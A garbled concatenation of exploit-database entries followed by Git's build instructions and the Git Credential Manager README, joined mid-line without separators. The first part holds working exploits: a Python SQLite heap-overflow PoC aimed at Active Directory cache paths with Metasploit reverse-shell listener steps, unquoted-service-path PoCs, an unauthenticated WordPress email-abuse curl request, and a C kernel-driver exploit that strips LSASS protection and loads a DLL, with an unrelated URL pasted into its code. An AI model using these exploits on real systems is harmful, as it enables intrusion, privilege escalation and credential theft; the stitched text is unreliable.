
		Git installation
# Exploit Title:  SQLite 3.50.1 -  Heap Overflow 
# Date: 2025-11-05
# Author: Mohammed Idrees Banyamer
# Author Country: Jordan
# Instagram: @banyamer_security
# GitHub: https://github.com/mbanyamer
# Vendor Homepage: https://www.sqlite.org
# Software Link: https://www.sqlite.org/download.html
# Version: SQLite < 3.50.2 (winsqlite3.dll)
# Tested on: Windows Server 2022 (Build 20348), Windows Server 2025 (Build 26100) - Unpatched
# CVE: CVE-2025-6965
# CVSS: 7.2 (High) - CVSS:4.0/AV:N/AC:H/AT:P/PR:L/UI:N/VC:L/VI:H/VA:L
# Category: windows / local / dos / memory_corruption / active_directory
# Platform: Windows
# CRITICAL: This vulnerability affects ALL unpatched Windows Server instances using winsqlite3.dll
# Including: Active Directory, Group Policy, Certificate Services, and Azure AD Connect
# Impact: Service Crash, DoS, Potential RCE, Domain Controller Compromise
# Fix: Apply latest Windows Cumulative Update (post-July 2025) or upgrade SQLite to 3.50.2+
# Advisory: https://nvd.nist.gov/vuln/detail/CVE-2025-6965
# Patch: https://www.sqlite.org/src/info/5508b56fd24016c13981ec280ecdd833007c9d8dd595edb295b984c2b487b5c8
# OFFICIAL PoC: Triggers heap overflow in winsqlite3.dll via excessive aggregate functions
# Target: Windows Server (Active Directory Cache, Group Policy, Certificate Services)

import sqlite3
import os
import subprocess
import sys
import time

# ===============================
# CONFIGURATION - ACTIVE DIRECTORY EXPLOITATION
# ===============================
DB_PATH = "cve_2025_6965_winsqlite3.db"
AD_CACHE_DIR = r"C:\ProgramData\Microsoft\ADCache"  # Real AD Cache Path
AD_DB_TARGET = os.path.join(AD_CACHE_DIR, "ad_cache.db")
LISTENER_IP = "192.168.1.100"
LISTENER_PORT = 4444
SERVICE_NAME = "ADSyncService"  # Must be created manually: sc create ADSyncService binPath= "C:\path\to\service.exe"

# === VULNERABILITY CHECK ===
print(f"[!] SQLite Version: {sqlite3.sqlite_version}")
if sqlite3.sqlite_version_info >= (3, 50, 2):
    print("[-] SYSTEM PATCHED - SQLite 3.50.2+ Detected")
    print("    Update applied via Microsoft Cumulative Update (post-July 2025)")
    sys.exit(1)
else:
    print("[!] VULNERABLE: SQLite < 3.50.2 - Proceeding with exploit")

# ===============================
# STEP 1: Create Malicious AD Cache Database
# ===============================
def create_vulnerable_db():
    if os.path.exists(DB_PATH):
        os.remove(DB_PATH)
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    cur.execute("CREATE TABLE ad_cache (id INTEGER PRIMARY KEY, val INTEGER)")
    cur.execute("INSERT INTO ad_cache (val) VALUES (1)")
    conn.commit()
    conn.close()
    print(f"[+] Malicious database created: {DB_PATH}")

# ===============================
# STEP 2: Generate Truncation Payload (300+ Aggregates)
# ===============================
def generate_malicious_query(num=100):
    agg = [f"COUNT(*) AS c{i}, SUM(val) AS s{i}, AVG(val) AS a{i}" for i in range(num)]
    return f"SELECT {', '.join(agg)} FROM ad_cache"

# ===============================
# STEP 3: Deploy + Trigger in winsqlite3.dll Context
# ===============================
def deploy_and_trigger():
    print(f"[*] Deploying payload to AD Cache: {AD_DB_TARGET}")
    os.makedirs(AD_CACHE_DIR, exist_ok=True)
    subprocess.run(["copy", "/Y", DB_PATH, AD_DB_TARGET], shell=True, check=True)
    print(f"[+] Payload deployed to real AD path")

    query = generate_malicious_query(100)
    print(f"[*] Triggering heap overflow (300+ aggregates vs 1 column)...")

    try:
        conn = sqlite3.connect(AD_DB_TARGET)
        cur = conn.cursor()
        cur.execute(query)  # TRUNCATION BUG TRIGGERED
        print("[!] QUERY EXECUTED - UNEXPECTED (System may be patched or ASLR mitigated)")
    except Exception as e:
        print(f"[!] HEAP OVERFLOW CONFIRMED: {e}")
        print("    winsqlite3.dll memory corruption triggered")
        print("    In production: AD Service Crash, DC DoS, Potential RCE")
    finally:
        conn.close()

    # Force service reload (real AD services auto-query cache)
    print(f"[*] Restarting {SERVICE_NAME} to reload winsqlite3.dll...")
    try:
        subprocess.run(["net", "stop", SERVICE_NAME], shell=True, timeout=10, capture_output=True)
    except:
        pass
    time.sleep(2)
    result = subprocess.run(["net", "start", SERVICE_NAME], shell=True, capture_output=True)
    if result.returncode == 0:
        print("[+] Service restarted - Monitor Event Viewer for winsqlite3.dll fault")
    else:
        print(f"[-] Service error: {result.stderr.decode()}")

# ===============================
# STEP 4: RCE Listener Setup (For Advanced Exploitation)
# ===============================
def print_listener():
    print("\n" + "="*70)
    print(" RCE EXPLOITATION (ADVANCED) - START LISTENER ON ATTACKER MACHINE:")
    print("="*70)
    print("msfconsole -q")
    print("use exploit/multi/handler")
    print("set payload windows/x64/meterpreter/reverse_tcp")
    print(f"set LHOST {LISTENER_IP}")
    print(f"set LPORT {LISTENER_PORT}")
    print("exploit -j")
    print("="*70 + "\n")

# ===============================
# MAIN - EXECUTION
# ===============================
if __name__ == "__main__":
    print("="*70)
    print(" CVE-2025-6965 EXPLOIT - WINDOWS SERVER ACTIVE DIRECTORY")
    print(" Heap Overflow in winsqlite3.dll via SQLite Aggregate Truncation")
    print(" Author: Mohammed Idrees Banyamer (@banyamer_security)")
    print("="*70)

    create_vulnerable_db()
    deploy_and_trigger()
    print_listener()

    print("[+] EXPLOIT EXECUTED SUCCESSFULLY")
    print("    Check Event Viewer: Application Log → winsqlite3.dll Access Violation (0xC0000005)")
    print("    Fix: Apply latest Windows Cumulative Update IMMEDIATELY")
    print("    All Domain Controllers must be patched within 24 hours")# Exploit Title: NetBT e-Fatura - Privilege Escalation
# Author: Seccops
# Discovery Date: 2025-10-03
# Vendor: https://net-bt.com.tr/e-fatura/
# Tested Version: 2024
# Tested on OS: Microsoft Windows Server 2019 DC
# Vulnerability Type: CWE-428 Unquoted Search Path or Element
# CVE: CVE-2025-14018

Note: Thanks "Levent Sungu" for providing the testing environment.

====================
Description & Impact
====================
This vulnerability allows an unauthorized local user to execute arbitrary code with high privileges on the system.

================
Proof of Concept
================

C:\Users\efatura>sc qc InboxProcessor
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: InboxProcessor
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\inetpub\wwwroot\InboxProcessor\Netbt.Inbox.Process.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : InboxProcessor
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem


C:\Users\efatura\Desktop>accesschk.exe /accepteula -uwdq "C:\inetpub\wwwroot\InboxProcessor\"

Accesschk v6.15 - Reports effective permissions for securable objects
Copyright (C) 2006-2022 Mark Russinovich
Sysinternals - www.sysinternals.com

C:\inetpub\wwwroot\InboxProcessor
  RW BUILTIN\Users
  RW NT SERVICE\TrustedInstaller
  RW NT AUTHORITY\SYSTEM
  RW BUILTIN\Administrators# Exploit Title: AVAST Antivirus 25.11 - Unquoted Service Path
# Exploit Author: Milad Karimi (Ex3ptionaL)
# Contact: miladgrayhat@gmail.com
# Date: 2025-12-17
# Vendor Homepage:https://www.avast.com/
# Software Link :
https://www.avast.com/es-mx/download-thank-you.php?product=SLN&locale=es-mx
# Tested Version: 25.11
# Tested on OS: Windows 11


Description
AVAST Antivirus 25.11 an unquoted service path vulnerability that allows
local non-privileged users to potentially execute code with elevated SYSTEM
privileges. Attackers can exploit the unquoted service path configuration
to inject malicious executables that will be run with high-level system
permissions.



PoC
C:\>sc qc SecureLine
[SC] QueryServiceConfig CORRECTO

NOMBRE_SERVICIO: SecureLine
        TIPO : 10 WIN32_OWN_PROCESS
        TIPO_INICIO : 2 AUTO_START
        CONTROL_ERROR : 1 NORMAL
        NOMBRE_RUTA_BINARIO: C:\Program Files\AVAST
Software\SecureLine\VpnSvc.exe
        GRUPO_ORDEN_CARGA :
        ETIQUETA : 0
        NOMBRE_MOSTRAR : Avast SecureLine
        DEPENDENCIAS :
        NOMBRE_INICIO_SERVICIO: LocalSystem# Exploit Title: WordPress Plugin 5.2.0 - Broken Access Control
# Date: 2025-09-20
# Exploit Author: Zeeshan Haider
# Vendor Homepage: https://wordpress.org/plugins/
# Software Link: https://wordpress.org/plugins/highlight-and-share/
# Version: <= 5.2.0 (REQUIRED)
# Tested on: WordPress 6.x, Kali Linux
# CVE: CVE-2025-67586

==> Description
A broken access control vulnerability exists in a WordPress plugin developed by DLX Plugins.
The plugin exposes an unauthenticated AJAX action that allows attackers to abuse the
"Share via Email" functionality without proper permission checks.

An unauthenticated attacker can reuse a valid post nonce to trigger email sharing requests,
leading to unauthorized email sending (email spam / abuse) without user authentication.

==> Privileges Required
None (Unauthenticated)


==> Proof of Concept (PoC)

> Step 1: Pick website with Installed Plugin 

> Step 2: Obtain a Valid Nonce
  1. Open a public post.
  2. Highlight text and click **Share via Email**.
  3. Open Developer Tools → Network → XHR.
  4. Send the email once.
  5. Capture the request containing:
   action=has_email_social_modal
   nonce=<NONCE>
   post_id=<POSTID>

Step 3: Exploit via Unauthenticated Request

> bash cmd: (replace website URL, post URL, and nonce)

curl -s -i -X POST 'http://localhost/wp-admin/admin-ajax.php' \
-d 'action=has_email_form_submission' \
-d 'formData[postId]=<POSTID>' \
-d 'formData[permalink]=http://localhost/?p=<POSTID>' \
-d 'formData[nonce]=<NONCE>' \
-d 'formData[toEmail]=attacker@example.com' \
-d 'formData[subject]=PoC' \
-d 'formData[shareText]=POC test' \
-d 'formData[emailShareType]=selection' \
--compressed


--> Expected JSON response:

{
"success": true,
"data": {
"errors": false,
"message_title": "This post has been shared!",
"message_body": "You have shared this post with attacker@example.com",
"message_subject": "[Shared Post] <POST TITLE>",
"message_source_name": "Site Name",
"message_source_email": "site@example.com"
}
}# Exploit Title: Throttlestop Kernel Driver - Kernel Out-of-Bounds Write Privilege Escalation 
# Exploit Details: https://xavibel.com/2025/12/22/using-vulnerable-drivers-in-red-team-exercises/
# Date: 8/12/2025
# Exploit Author: Xavi Beltran
# Vendor Homepage: https://www.techpowerup.com/download/techpowerup-throttlestop/
# Version: 3.0.0.0
# Tested on: Windows 11
# CVE-2025-7771

#define WIN32_NO_STATUS
#define SECURITY_WIN32
#include <Windows.h>
#include <Psapi.h>
#include <superfetch/superfetch.h>
#include <tlhelp32.h>
#include <string>
#include <sspi.h>

# define IOCTL_MMMAPIOSPACE  0x8000645C
#pragma comment(lib, "Secur32.lib")

#pragma pack(push,1)
typedef struct {
    ULONGLONG PhysicalAddress; // +0
    DWORD     NumberOfBytes;   // +8
} PHYS_REQ;                    // 0x0C
#pragma pack(pop)

// Struct needed to call nt!NtQueryIntervalProfile
typedef NTSTATUS(WINAPI* NtQueryIntervalProfile_t)(IN ULONG ProfileSource, OUT PULONG Interval);

LPVOID GetBaseAddr(LPCWSTR drvname)
{
    LPVOID drivers[1024];
    DWORD cbNeeded;
    int nDrivers, i = 0;
    if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers))
    {
        WCHAR szDrivers[1024];
        nDrivers = cbNeeded / sizeof(drivers[0]);
        for (i = 0; i < nDrivers; i++)
        {
            if (GetDeviceDriverBaseName(drivers[i], szDrivers, sizeof(szDrivers) / sizeof(szDrivers[0])))
            {
                if (wcscmp(szDrivers, drvname) == 0)
                {
                    return drivers[i];
                }
            }
        }
    }
    return 0;
}

uint64_t xRead(HANDLE hDrv, uint64_t virt_addr) {
    auto mm = spf::memory_map::current();
    if (!mm) {
        printf("[!] Superfetch init failed!\n");
        return 0;
    }

    auto phys = mm->translate((void*)virt_addr);
    if (!phys) {
        printf("[!] Translate failed for VA %p!\n", (void*)virt_addr);
        return 0;
    }

    //printf("[+] Virtual Adress=0x%016llx -> Physical Address 0x%016llx\n", virt_addr, phys);
    // --- PHYSICAL READ ---
    PHYS_REQ in{};
    in.PhysicalAddress = phys;
    in.NumberOfBytes = 0x8;
    ULONGLONG out = 0;
    DWORD br = 0;
    BOOL ok = DeviceIoControl(hDrv,
        IOCTL_MMMAPIOSPACE,
        &in, sizeof(in),    // 0x0C
        &out, sizeof(out), //  Accepts 4 or 8
        &br, nullptr);

    //printf("[+] IOCTL OK=%d, br=%lu, err=%lu, Mapped Memory Ptr=0x%llx\n", ok, br, GetLastError(), (unsigned long long)out);
    if (ok && br == 8 && out) {
        ULONGLONG result = *(volatile ULONGLONG*)(uintptr_t)out; // 8 bytes exactos
              printf("[+] READ WHERE: 0x%016llx | CONTENT: 0x%016llx\n", (unsigned long long)virt_addr, (unsigned long long)result);
        return result;
    }

    return -1;
}

uint64_t xWrite(HANDLE hDrv, uint64_t where, uint64_t what) {
    auto mm = spf::memory_map::current();
    if (!mm) {
        printf("[!] Superfetch init failed!\n");
        return 0;
    }

    auto phys = mm->translate((void*)where);
    if (!phys) {
        printf("[!] Translate failed for VA %p!\n", (void*)where);
        return 0;
    }

    //printf("[+] Virtual Adress=0x%016llx -> Physical Address 0x%016llx\n", where, phys);
    PHYS_REQ in{};
    in.PhysicalAddress = phys;
    in.NumberOfBytes = 0x8;
    ULONGLONG out = 0;
    DWORD br = 0;
    BOOL ok = DeviceIoControl(hDrv,
        IOCTL_MMMAPIOSPACE,
        &in, sizeof(in),    // 0x0C
        &out, sizeof(out), // 8 (Accepts 4 or 8)
        &br, nullptr);

    //printf("[+] IOCTL OK=%d, br=%lu, err=%lu, Mapped Memory Ptr=0x%llx\n", ok, br, GetLastError(), (unsigned long long)out);
    if (ok && br == 8 && out) {
        ULONGLONG result = *(volatile ULONGLONG*)(uintptr_t)out; // 8 bytes exactos
    }

    // WRITE
    printf("[+] WRITE WHAT: 0x%016llx | WHERE: 0x%016llx\n", (unsigned long long)what, (unsigned long long)where);
    *(uint64_t*)out = what;
    return 0;
}

DWORD FindProcessId(const std::wstring& processName) {
    DWORD processId = 0;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE)
        return 0;

    PROCESSENTRY32W entry;
    entry.dwSize = sizeof(PROCESSENTRY32W);

    if (Process32FirstW(snapshot, &entry)) {
        do {
            if (!_wcsicmp(entry.szExeFile, processName.c_str())) {
                processId = entry.th32ProcessID;
                break;
            }
        } while (Process32NextW(snapshot, &entry));
    }

    CloseHandle(snapshot);
    return processId;
}


int main()
{
    DWORD lsassPid = FindProcessId(L"lsass.exe");
    printf("[+] Target process PID: %d\n", lsassPid);
    //Installing the service

    SC_HANDLE hSCManager;
    SC_HANDLE hService;

    // Open the Service Control Manager
    hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (hSCManager == NULL) {
        printf("[!] Error opening SCM: %lu\n", GetLastError());
        return 1;
    }

    // Create the service
    hService = CreateService(
        hSCManager,               
        L"ThrottleStop",          
        L"ThrottleStop",           
        SERVICE_ALL_ACCESS,       
        SERVICE_KERNEL_DRIVER,    
        SERVICE_AUTO_START,       
        SERVICE_ERROR_NORMAL,    
        L"C:\\Users\\Public\\a.sys",
        NULL, NULL, NULL, NULL, NULL);

    if (hService == NULL) {
        printf("[+] Error creating service: %lu\n", GetLastError());
        CloseServiceHandle(hSCManager);
        //return 1;
    }

    printf("[!] Service created successfully.\n");

    if (!StartService(hService, 0, NULL)) {
        printf("[!] Error starting the service: %lu\n", GetLastError());
    }
    else {
        printf("[+] Service started correctly.\n");
    }

    LPVOID nt_base = GetBaseAddr(L"ntoskrnl.exe");
    printf("[+] NT base: %p\n", nt_base);

    HANDLE hDrv = NULL;
    hDrv = CreateFileA("\\\\.\\ThrottleStop",
        (GENERIC_READ | GENERIC_WRITE),
        0x00,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL);

    if (hDrv == INVALID_HANDLE_VALUE)
    {
        printf("[-] Failed to get a handle on driver!\n");
        return -1;
    }
    else {
        printf("[+] Handle on  driver received!\n");
    }

    ULONGLONG result = 0x0;

    // nt!PsInitialSystemProcess nt + 0x5412e0
    ULONGLONG system_eprocess = ULONGLONG(nt_base) + 0x5412e0;

    DWORD64 Eprocess = xRead(hDrv, (uint64_t)system_eprocess);
    printf("[+] EPROCESS: 0x%llX\n", Eprocess);
    DWORD64 CurrentProcessPid = xRead(hDrv, (uint64_t)system_eprocess + 0x2e0); // +0x2e0 UniqueProcessId : Ptr64 Void

    DWORD64 SearchProcessPid = 0;
    DWORD64 searchEprocess = Eprocess;
    while (1)
    {
        searchEprocess = xRead(hDrv, (uint64_t)searchEprocess + 0x2e8) - 0x2e8; // +0x2e8 ActiveProcessLinks : _LIST_ENTRY
        SearchProcessPid = xRead(hDrv, (uint64_t)searchEprocess + 0x2e0); // +0x2e0 UniqueProcessId : Ptr64 Void
        if (SearchProcessPid == lsassPid) // LSASS PROCESS
        {
            break;https://www.windowscentral.com/gaming/xbox/teaming-up-again-xbox-ceo-signals-new-discord-plans-tied-to-game-pass-flexibility
        }
    }

    printf("[+] Found LSASS EPROCESS!\n");
    printf("[+] Removing PPL Protection...\n");
    xWrite(hDrv, (uint64_t)searchEprocess + 0x6ca, 0x0); // +0x6ca Protection : _PS_PROTECTION
    printf("[+] Removing Signature Level Protection...\n");
    xWrite(hDrv, (uint64_t)searchEprocess + 0x6c8, 0x0);// +0x6c8 Protection : SignatureLevel : UChar
    printf("[+] LSASS protections disabled\n");
    CloseHandle(hDrv);

    SECURITY_PACKAGE_OPTIONS spo = {};
    SECURITY_STATUS ss = AddSecurityPackageA((LPSTR)"c:\\windows\\system32\\ntssp.dll", &spo);
    printf("[+] DLL Injection successful!\n");

    return 0;
}

Normally you can just do "make" followed by "make install", and that
will install the git programs in your own ~/bin/ directory.  If you want
to do a global install, you can do

	$ make prefix=/usr all doc info ;# as yourself
	# make prefix=/usr install install-doc install-html install-info ;# as root

(or prefix=/usr/local, of course).  Just like any program suite
that uses $prefix, the built results have some paths encoded,
which are derived from $prefix, so "make all; make prefix=/usr
install" would not work.

The beginning of the Makefile documents many variables that affect the way
git is built.  You can override them either from the command line, or in a
config.mak file.

Alternatively you can use autoconf generated ./configure script to
set up install paths (via config.mak.autogen), so you can write instead

	$ make configure ;# as yourself
	$ ./configure --prefix=/usr ;# as yourself
	$ make all doc ;# as yourself
	# make install install-doc install-html;# as root

If you're willing to trade off (much) longer build time for a later
faster git you can also do a profile feedback build with

	$ make prefix=/usr profile
	# make prefix=/usr PROFILE=BUILD install

This will run the complete test suite as training workload and then
rebuild git with the generated profile feedback. This results in a git
which is a few percent faster on CPU intensive workloads.  This
may be a good tradeoff for distribution packagers.

Alternatively you can run profile feedback only with the git benchmark
suite. This runs significantly faster than the full test suite, but
has less coverage:

	$ make prefix=/usr profile-fast
	# make prefix=/usr PROFILE=BUILD install

Or if you just want to install a profile-optimized version of git into
your home directory, you could run:

	$ make profile-install

or
	$ make profile-fast-install

As a caveat: a profile-optimized build takes a *lot* longer since the
git tree must be built twice, and in order for the profiling
measurements to work properly, ccache must be disabled and the test
suite has to be run using only a single CPU.  In addition, the profile
feedback build stage currently generates a lot of additional compiler
warnings.

Issues of note:

 - Ancient versions of GNU Interactive Tools (pre-4.9.2) installed a
   program "git", whose name conflicts with this program.  But with
   version 4.9.2, after long hiatus without active maintenance (since
   around 1997), it changed its name to gnuit and the name conflict is no
   longer a problem.

   NOTE: When compiled with backward compatibility option, the GNU
   Interactive Tools package still can install "git", but you can build it
   with --disable-transition option to avoid this.

 - You can use git after building but without installing if you want
   to test drive it.  Simply run git found in bin-wrappers directory
   in the build directory, or prepend that directory to your $PATH.
   This however is less efficient than running an installed git, as
   you always need an extra fork+exec to run any git subcommand.

   It is still possible to use git without installing by setting a few
   environment variables, which was the way this was done
   traditionally.  But using git found in bin-wrappers directory in
   the build directory is far simpler.  As a historical reference, the
   old way went like this:

	GIT_EXEC_PATH=`pwd`
	PATH=`pwd`:$PATH
	GITPERLLIB=`pwd`/perl/build/lib
	export GIT_EXEC_PATH PATH GITPERLLIB

 - By default (unless NO_PERL is provided) Git will ship various perl
   scripts. However, for simplicity it doesn't use the
   ExtUtils::MakeMaker toolchain to decide where to place the perl
   libraries. Depending on the system this can result in the perl
   libraries not being where you'd like them if they're expected to be
   used by things other than Git itself.

   Manually supplying a perllibdir prefix should fix this, if this is
   a problem you care about, e.g.:

       prefix=/usr perllibdir=/usr/$(/usr/bin/perl -MConfig -wle 'print substr $Config{installsitelib}, 1 + length $Config{siteprefixexp}')

   Will result in e.g. perllibdir=/usr/share/perl/5.26.1 on Debian,
   perllibdir=/usr/share/perl5 (which we'd use by default) on CentOS.

 - Unless NO_PERL is provided Git will ship various perl libraries it
   needs. Distributors of Git will usually want to set
   NO_PERL_CPAN_FALLBACKS if NO_PERL is not provided to use their own
   copies of the CPAN modules Git needs.

 - Git is reasonably self-sufficient, but does depend on a few external
   programs and libraries.  Git can be used without most of them by adding
   the appropriate "NO_<LIBRARY>=YesPlease" to the make command line or
   config.mak file.

	- "zlib", the compression library. Git won't build without it.

	- "ssh" is used to push and pull over the net.

	- A POSIX-compliant shell is required to run some scripts needed
	  for everyday use (e.g. "bisect", "request-pull").

	- "Perl" version 5.26.0 or later is needed to use some of the
	  features (e.g. sending patches using "git send-email",
	  interacting with svn repositories with "git svn").  If you can
	  live without these, use NO_PERL.  Note that recent releases of
	  Redhat/Fedora are reported to ship Perl binary package with some
	  core modules stripped away (see https://lwn.net/Articles/477234/),
	  so you might need to install additional packages other than Perl
	  itself, e.g. Digest::MD5, File::Spec, File::Temp, Net::Domain,
	  Net::SMTP, and Time::HiRes.

	- "libcurl" library is used for fetching and pushing
	  repositories over http:// or https://, as well as by
	  git-imap-send. If you do not need that functionality,
	  use NO_CURL to build without it.

	  Git requires version "7.61.0" or later of "libcurl" to build
	  without NO_CURL. This version requirement may be bumped in
	  the future.

	- "expat" library; git-http-push uses it for remote lock
	  management over DAV.  Similar to "curl" above, this is optional
	  (with NO_EXPAT).

	- "wish", the Tcl/Tk windowing shell is used in gitk to show the
	  history graphically, and in git-gui.  If you don't want gitk or
	  git-gui, you can use NO_TCLTK.

	- A gettext library is used by default for localizing Git. The
	  primary target is GNU libintl, but the Solaris gettext
	  implementation also works.

	  We need a gettext.h on the system for C code, gettext.sh (or
	  Solaris gettext(1)) for shell scripts, and libintl-perl for Perl
	  programs.

	  Set NO_GETTEXT to disable localization support and make Git only
	  use English. Under autoconf the configure script will do this
	  automatically if it can't find libintl on the system.

	- Python version 2.7 or later is needed to use the git-p4 interface
	  to Perforce.

 - Some platform specific issues are dealt with Makefile rules,
   but depending on your specific installation, you may not
   have all the libraries/tools needed, or you may have
   necessary libraries at unusual locations.  Please look at the
   top of the Makefile to see what can be adjusted for your needs.
   You can place local settings in config.mak and the Makefile
   will include them.  Note that config.mak is not distributed;
   the name is reserved for local settings.

 - To build and install documentation suite, you need to have
   the asciidoc/xmlto toolchain.  Because not many people are
   inclined to install the tools, the default build target
   ("make all") does _not_ build them.

   "make doc" builds documentation in man and html formats; there are
   also "make man", "make html" and "make info". Note that "make html"
   requires asciidoc, but not xmlto. "make man" (and thus make doc)
   requires both.

   "make install-doc" installs documentation in man format only; there
   are also "make install-man", "make install-html" and "make
   install-info".

   Building and installing the info file additionally requires
   makeinfo and docbook2X.  Version 0.8.3 is known to work.

   Building and installing the pdf file additionally requires
   dblatex.  Version >= 0.2.7 is known to work.

   All formats require at least asciidoc 8.4.1. Alternatively, you can
   use Asciidoctor (requires Ruby) by passing USE_ASCIIDOCTOR=YesPlease
   to make. You need at least Asciidoctor version 1.5.

   There are also "make quick-install-doc", "make quick-install-man"
   and "make quick-install-html" which install preformatted man pages
   and html documentation. To use these build targets, you need to
   clone two separate git-htmldocs and git-manpages repositories next
   to the clone of git itself.

   The minimum supported version of docbook-xsl is 1.74.

   Users attempting to build the documentation on Cygwin may need to ensure
   that the /etc/xml/catalog file looks something like this:

   <?xml version="1.0"?>
   <!DOCTYPE catalog PUBLIC
      "-//OASIS//DTD Entity Resolution XML Catalog V1.0//EN"
      "http://www.oasis-open.org/committees/entity/release/1.0/catalog.dtd"
   >
   <catalog xmlns="urn:oasis:names:tc:entity:xmlns:xml:catalog">
     <rewriteURI
       uriStartString = "http://docbook.sourceforge.net/release/xsl/current"
       rewritePrefix = "/usr/share/sgml/docbook/xsl-stylesheets"
     />
     <rewriteURI
       uriStartString="http://www.oasis-open.org/docbook/xml/4.5"
       rewritePrefix="/usr/share/sgml/docbook/xml-dtd-4.5"
     />
  </catalog>

  This can be achieved with the following two xmlcatalog commands:

  xmlcatalog --noout \
     --add rewriteURI \
        http://docbook.sourceforge.net/release/xsl/current \
        /usr/share/sgml/docbook/xsl-stylesheets \
     /etc/xml/catalog

  xmlcatalog --noout \
     --add rewriteURI \
         http://www.oasis-open.org/docbook/xml/4.5/xsl/current \
         /usr/share/sgml/docbook/xml-dtd-4.5 \
     /etc/xml/catalog# Git Credential Manager

[![Build Status][build-status-badge]][workflow-status]

---

[Git Credential Manager][gcm] (GCM) is a secure
[Git credential helper][git-credential-helper] built on [.NET][dotnet] that runs
on Windows, macOS, and Linux. It aims to provide a consistent and secure
authentication experience, including multi-factor auth, to every major source
control hosting service and platform.

GCM supports (in alphabetical order) [Azure DevOps][azure-devops], Azure DevOps
Server (formerly Team Foundation Server), Bitbucket, GitHub, and GitLab.
Compare to Git's [built-in credential helpers][git-tools-credential-storage]
(Windows: wincred, macOS: osxkeychain, Linux: gnome-keyring/libsecret), which
provide single-factor authentication support for username/password only.

GCM replaces both the .NET Framework-based
[Git Credential Manager for Windows][gcm-for-windows] and the Java-based
[Git Credential Manager for Mac and Linux][gcm-for-mac-and-linux].

## Install

See the [installation instructions][install] for the current version of GCM for
install options for your operating system.

## Current status

Git Credential Manager is currently available for Windows, macOS, and Linux\*.
GCM only works with HTTP(S) remotes; you can still use Git with SSH:

- [Azure DevOps SSH][azure-devops-ssh]
- [GitHub SSH][github-ssh]
- [Bitbucket SSH][bitbucket-ssh]

Feature|Windows|macOS|Linux\*
-|:-:|:-:|:-:
Installer/uninstaller|&#10003;|&#10003;|&#10003;
Secure platform credential storage [(see more)][gcm-credstores]|&#10003;|&#10003;|&#10003;
Multi-factor authentication support for Azure DevOps|&#10003;|&#10003;|&#10003;
Two-factor authentication support for GitHub|&#10003;|&#10003;|&#10003;
Two-factor authentication support for Bitbucket|&#10003;|&#10003;|&#10003;
Two-factor authentication support for GitLab|&#10003;|&#10003;|&#10003;
Windows Integrated Authentication (NTLM/Kerberos) support|&#10003;|_N/A_|_N/A_
Basic HTTP authentication support|&#10003;|&#10003;|&#10003;
Proxy support|&#10003;|&#10003;|&#10003;
`amd64` support|&#10003;|&#10003;|&#10003;
`x86` support|&#10003;|_N/A_|&#10007;
`arm64` support|best effort|&#10003;|&#10003;
`armhf` support|_N/A_|_N/A_|&#10003;

(\*) GCM guarantees support only for [the Linux distributions that are officially
supported by dotnet][dotnet-distributions].

## Supported Git versions

Git Credential Manager tries to be compatible with the broadest set of Git
versions (within reason). However there are some known problematic releases of
Git that are not compatible.

- Git 1.x

  The initial major version of Git is not supported or tested with GCM.

- Git 2.26.2

  This version of Git introduced a breaking change with parsing credential
  configuration that GCM relies on. This issue was fixed in commit
  [`12294990`][gcm-commit-12294990] of the Git project, and released in Git
  2.27.0.

## How to use

Once it's installed and configured, Git Credential Manager is called implicitly
by Git. You don't have to do anything special, and GCM isn't intended to be
called directly by the user. For example, when pushing (`git push`) to
[Azure DevOps][azure-devops], [Bitbucket][bitbucket], or [GitHub][github], a
window will automatically open and walk you through the sign-in process. (This
process will look slightly different for each Git host, and even in some cases,
whether you've connected to an on-premises or cloud-hosted Git host.) Later Git
commands in the same repository will re-use existing credentials or tokens that
GCM has stored for as long as they're valid.

Read full command line usage [here][gcm-usage].

### Configuring a proxy

See detailed information [here][gcm-http-proxy].

## Additional Resources

See the [documentation index][docs-index] for links to additional resources.

## Experimental Features

- [Windows broker (experimental)][gcm-windows-broker]

## Future features

Curious about what's coming next in the GCM project? Take a look at the [project
roadmap][roadmap]! You can find more details about the construction of the
roadmap and how to interpret it [here][roadmap-announcement].

## Contributing

This project welcomes contributions and suggestions.
See the [contributing guide][gcm-contributing] to get started.

This project follows [GitHub's Open Source Code of Conduct][gcm-coc].

## License

We're [MIT][gcm-license] licensed.
When using GitHub logos, please be sure to follow the
[GitHub logo guidelines][github-logos].

[azure-devops]: https://azure.microsoft.com/en-us/products/devops
[azure-devops-ssh]: https://docs.microsoft.com/en-us/azure/devops/repos/git/use-ssh-keys-to-authenticate?view=azure-devops
[bitbucket]: https://bitbucket.org
[bitbucket-ssh]: https://confluence.atlassian.com/bitbucket/ssh-keys-935365775.html
[build-status-badge]: https://github.com/git-ecosystem/git-credential-manager/actions/workflows/continuous-integration.yml/badge.svg
[docs-index]: https://github.com/git-ecosystem/git-credential-manager/blob/release/docs/README.md
[dotnet]: https://dotnet.microsoft.com
[dotnet-distributions]: https://learn.microsoft.com/en-us/dotnet/core/install/linux
[git-credential-helper]: https://git-scm.com/docs/gitcredentials
[gcm]: https://github.com/git-ecosystem/git-credential-manager
[gcm-coc]: CODE_OF_CONDUCT.md
[gcm-commit-12294990]: https://github.com/git/git/commit/12294990c90e043862be9eb7eb22c3784b526340
[gcm-contributing]: CONTRIBUTING.md
[gcm-credstores]: https://github.com/git-ecosystem/git-credential-manager/blob/release/docs/credstores.md
[gcm-for-mac-and-linux]: https://github.com/microsoft/Git-Credential-Manager-for-Mac-and-Linux
[gcm-for-windows]: https://github.com/microsoft/Git-Credential-Manager-for-Windows
[gcm-http-proxy]: https://github.com/git-ecosystem/git-credential-manager/blob/release/docs/netconfig.md#http-proxy
[gcm-license]: LICENSE
[gcm-usage]: https://github.com/git-ecosystem/git-credential-manager/blob/release/docs/usage.md
